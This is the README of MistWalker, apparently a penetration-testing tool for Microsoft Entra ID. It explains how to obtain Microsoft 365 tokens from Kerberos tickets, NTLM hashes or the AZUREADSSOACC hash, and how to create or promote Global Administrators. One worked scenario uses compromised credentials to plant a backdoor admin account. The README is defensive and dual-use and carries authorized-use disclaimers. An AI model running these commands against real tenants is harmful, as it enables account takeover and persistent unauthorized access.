# MistWalker

**Unified Entra ID Management and Token Acquisition Tool**

MistWalker combines the power of [SeamlessPass](https://github.com/Malcrove/SeamlessPass) (Kerberos-based Azure token acquisition) with Foghorn (Entra ID user and role management) to provide a complete toolkit for Azure AD penetration testing and administration.

## Features

### 🔐 Token Acquisition (SeamlessPass Integration)
- Acquire Microsoft 365 access tokens using Kerberos tickets
- Support for TGT, TGS, NTLM hashes, and password authentication
- Seamless SSO exploitation for cloud access
- Token storage and management across sessions

### 👥 User Management (Foghorn Integration)
- Create new users in Entra ID
- Assign Global Administrator roles
- Promote/demote existing users
- Comprehensive user auditing
- Secure password generation

### 🚀 Combined Workflows
- End-to-end authentication and user creation
- Automated token handoff between components
- Multi-tenant support
- Configuration management

## Installation

```bash
# Clone the repository
git clone <repository-url>
cd mistwalker

# Install dependencies
pip install -r requirements.txt

# Install the package
pip install .
```

## Quick Start

### 1. Acquire Tokens with SeamlessPass

```bash
# Using username/password
mistwalker auth -tenant corp.com -domain corp.local -dc_host dc.corp.local -username user -password pass --store-tokens

# Using TGT
mistwalker auth -tenant corp.com -tgt <base64_TGT> --store-tokens

# Using NTLM hash
mistwalker auth -tenant corp.com -domain corp.local -dc_host dc.corp.local -username user -ntlm DEADBEEF... --store-tokens

# Using AZUREADSSOACC NTLM hash
mistwalker auth -tenant corp.com -adssoacc-ntlm DEADBEEFDEADBEEFDEADBEEFDEADBEEF -user-sid S-1-5-21-1234567890-1234567890-1234567890-1234 --store-tokens
```

### 2. Manage Users with Foghorn

```bash
# Create Global Administrator (using stored tokens)
mistwalker admin create-admin -u admin@corp.com --generate-password

# Create regular user
mistwalker admin create-user -u user@corp.com -p "UserPass123!"

# List all Global Administrators
mistwalker admin list-admins

# Promote existing user
mistwalker admin promote-user -u existing@corp.com
```

### 3. Complete Workflows

```bash
# End-to-end: Authenticate + Create Admin
mistwalker workflow create-admin \
  -tenant corp.com -domain corp.local -dc dc.corp.local \
  -username user -password pass \
  --admin-username admin@corp.com --generate-password

# Authenticate + Promote User
mistwalker workflow promote-user \
  -tenant corp.com -tgt <base64_TGT> \
  --promote-user existing@corp.com

# Authenticate + Audit Admins
mistwalker workflow audit-admins \
  -tenant corp.com -domain corp.local -dc dc.corp.local \
  -username user -password pass
```

## Command Reference

### Authentication (`mistwalker auth`)
```bash
mistwalker auth [OPTIONS]

Options:
  -t, --tenant TEXT          Tenant domain (required)
  -d, --domain TEXT          Local domain
  -dc, --dc-ip, --dc_host TEXT  Domain controller
  -u, --username TEXT        Username
  -p, --password TEXT        Password
  -n, --ntlm TEXT           NTLM hash
  -tgt TEXT                 TGT ticket
  -tgs TEXT                 TGS ticket
  --store-tokens            Store tokens for later use
```

### Administration (`mistwalker admin`)
```bash
# Create Global Administrator
mistwalker admin create-admin -u <username> [--generate-password]

# Create regular user
mistwalker admin create-user -u <username> -p <password>

# Promote user to Global Admin
mistwalker admin promote-user -u <user_id_or_upn>

# List Global Administrators
mistwalker admin list-admins

# Test token validity
mistwalker admin test-token
```

### Workflows (`mistwalker workflow`)
```bash
# Complete admin creation workflow
mistwalker workflow create-admin [SEAMLESSPASS_OPTIONS] --admin-username TEXT

# Complete user promotion workflow
mistwalker workflow promote-user [SEAMLESSPASS_OPTIONS] --promote-user TEXT

# Complete admin audit workflow
mistwalker workflow audit-admins [SEAMLESSPASS_OPTIONS]
```

## Security Considerations

### ⚠️ Important Security Notes

1. **Authorized Use Only**: This tool is designed for authorized penetration testing and legitimate administrative purposes only.

2. **Token Security**: 
   - Tokens are stored in memory by default
   - Use secure file permissions if caching tokens
   - Clear tokens after use: `mistwalker auth clear --confirm`

3. **Password Security**:
   - Use `--generate-password` for cryptographically secure passwords
   - Avoid hardcoding passwords in scripts
   - Consider using configuration files with proper permissions

4. **Network Security**:
   - All communications use HTTPS/TLS
   - Supports proxy configuration for testing environments
   - Validates SSL certificates by default

5. **Audit Trail**:
   - All operations are logged
   - Use `--debug` for detailed operation logs
   - Monitor created accounts and role assignments

## Examples

### Penetration Testing Scenario

```bash
# 1. Acquire tokens using compromised credentials
mistwalker auth \
  -tenant target.com -domain target.local -dc_host dc.target.local \
  -username compromised_user -password found_password \
  --store-tokens

# 2. Create backdoor admin account
mistwalker admin create-admin \
  -u backdoor@target.com --generate-password

# 3. Audit existing admins
mistwalker admin list-admins
```

### Administrative Scenario

```bash
# 1. Authenticate with admin credentials
mistwalker auth \
  -tenant company.com -domain company.local -dc_host dc.company.local \
  -username admin -password admin_pass \
  --store-tokens

# 2. Create new admin user
mistwalker admin create-admin \
  -u newadmin@company.com --generate-password

# 3. Audit all admins
mistwalker admin list-admins
```

## Troubleshooting

### Common Issues

1. **Token Acquisition Fails**
   ```bash
   # Test connectivity and credentials
   mistwalker auth -tenant corp.com -domain corp.local -dc_host dc.corp.local -username user -password pass --debug
   ```

2. **Permission Denied**
   ```bash
   # Check token validity
   mistwalker admin test-token
   
   # Verify user has sufficient privileges
   mistwalker admin list-admins
   ```

3. **SSL/TLS Issues**
   ```bash
   # Use proxy for debugging
   mistwalker auth -tenant corp.com [...] -proxy http://burp:8080
   ```

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make changes following security best practices
4. Add tests for new functionality
5. Submit a pull request

## Thanks

This project builds upon the excellent work of:

- **[SeamlessPass](https://github.com/Malcrove/SeamlessPass)** by [Abood Nour (@0xSyndr0me)](https://twitter.com/0xSyndr0me) - [Malcrove](https://malcrove.com/)
  
  SeamlessPass provides the core Kerberos-based Azure token acquisition functionality that powers MistWalker's authentication capabilities. We are grateful for this innovative tool that enables seamless SSO exploitation for cloud access.

Additional acknowledgments:
- **Impacket** by [SecureAuthCorp](https://github.com/SecureAuthCorp/impacket)
- **AADInternals** by [Dr. Nestori Syynimaa](https://twitter.com/DrAzureAD)

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Disclaimer

This tool is provided for educational and authorized testing purposes only. Users are responsible for complying with applicable laws and regulations. The authors are not responsible for any misuse or damage caused by this tool.

**Use only on systems you own or have explicit permission to test.**
